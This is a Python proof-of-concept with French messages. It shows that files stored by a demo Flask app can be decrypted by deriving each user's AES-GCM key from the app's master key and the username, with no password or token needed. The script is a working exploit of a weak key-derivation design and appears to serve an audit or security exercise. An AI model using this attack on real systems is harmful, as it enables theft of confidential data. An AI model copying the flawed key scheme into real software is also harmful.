import hashlib
import io
import secrets

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

from app.app import app, STORAGE
from app.config import MASTER_KEY


def require_status(response, expected):
    if response.status_code != expected:
        raise SystemExit(
            f"Erreur HTTP {response.status_code} : "
            f"{response.get_data(as_text=True)}"
        )


def prepare_demo():
    username = "alice_" + secrets.token_hex(4)
    password = secrets.token_urlsafe(24)
    original = b"Document confidentiel : demonstration."

    with app.test_client() as client:
        response = client.post(
            "/register",
            json={"username": username, "password": password},
        )
        require_status(response, 201)

        response = client.post(
            "/login",
            json={"username": username, "password": password},
        )
        require_status(response, 200)
        token = response.get_json()["token"]

        response = client.post(
            "/upload",
            headers={"Authorization": f"Bearer {token}"},
            data={"file": (io.BytesIO(original), "secret.txt")},
            content_type="multipart/form-data",
        )
        require_status(response, 201)
        file_id = response.get_json()["file_id"]

    entry = STORAGE[file_id]
    stolen_entry = {
        "owner": entry["owner"],
        "blob": bytes(entry["blob"]),
    }
    return file_id, stolen_entry, original


def attack(stolen_entry):
    username = stolen_entry["owner"]
    blob = stolen_entry["blob"]

    recovered_key = hashlib.sha256(
        MASTER_KEY + username.encode()
    ).digest()

    nonce = blob[:12]
    ciphertext_and_tag = blob[12:]

    return AESGCM(recovered_key).decrypt(
        nonce, ciphertext_and_tag, None
    )


if __name__ == "__main__":
    file_id, stolen_entry, original = prepare_demo()

    plaintext = attack(stolen_entry)

    if plaintext != original:
        raise SystemExit("Échec : le contenu récupéré est incorrect.")

    print(f"[+] Fichier cible : {file_id}")
    print(f"[+] Propriétaire : {stolen_entry['owner']}")
    print(f"[+] Contenu déchiffré : {plaintext!r}")
    print(
        "[+] Démontrée : déchiffrement à partir de la clé maître "
        "et du stockage, sans mot de passe ni token dans l'attaque."
    )